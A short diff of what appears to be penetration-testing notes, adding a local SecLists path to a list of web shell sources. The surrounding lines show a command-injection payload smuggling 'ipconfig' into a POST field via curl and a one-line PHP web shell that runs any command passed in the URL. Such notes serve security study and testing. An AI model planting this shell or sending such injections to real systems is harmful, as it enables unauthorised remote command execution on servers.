@@ -26,7 +26,7 @@ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
 ```
 
 ## Web Shells
-- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
+- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) - `/opt/useful/seclists/Web-Shells`
 - [phpbash](https://github.com/Arrexel/phpbash)
 ```
 <?php system($_GET['cmd']); ?>
